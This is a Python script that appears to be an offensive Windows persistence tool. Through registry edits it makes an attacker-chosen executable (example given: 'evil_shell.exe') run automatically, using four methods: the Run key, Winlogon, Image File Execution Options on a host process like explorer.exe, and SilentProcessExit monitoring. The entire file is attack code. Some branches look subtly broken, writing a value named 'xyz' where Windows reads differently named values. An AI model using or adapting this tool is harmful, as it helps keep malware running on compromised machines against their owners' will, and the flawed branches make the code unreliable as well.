#!/usr/bin/python3

import os
import argparse

if __name__ == '__main__':
	parser = argparse.ArgumentParser(usage="%(prog)s <target exe> <host exe> <option>")
	parser.add_argument(metavar="TARGET EXE", help="Exe that has to be triggered. (example: evil_shell.exe)", dest="target")
	parser.add_argument(metavar="HOST EXE", help="Exe that will trigger the target. (default: explorer.exe)", dest="host", nargs="?", default="explorer.exe")
	parser.add_argument(metavar="OPTION", help="Options to trigger. [runkeys, winlogon, open, close]", dest="option")
	args = parser.parse_args()

	option = args.option.lower()
	if option == "runkeys":
		os.system("reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v xyz /t reg_sz /d %s /f" % args.target)

	elif option == "winlogon":
		os.system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v xyz /t reg_sz /d %s /f" % args.target)

	elif option == "open":
		os.system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s\" /v xyz /t reg_sz /d \"cmd /C %s & %s /f\"" % (args.host, args.host, args.target))

	elif option == "close":
		os.system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s\" /v GlobalFlag /t reg_dword /d 512 /f" % args.host)
		os.system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\%s\" /v ReportingMode /t reg_dword /d 1 /f" % args.host)
		os.system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\%s\" /v MonitorProcess /t reg_sz /d %s /f" % (args.host, args.target))

	else:
		print("Option does not exist.\n")
		parser.print_help()
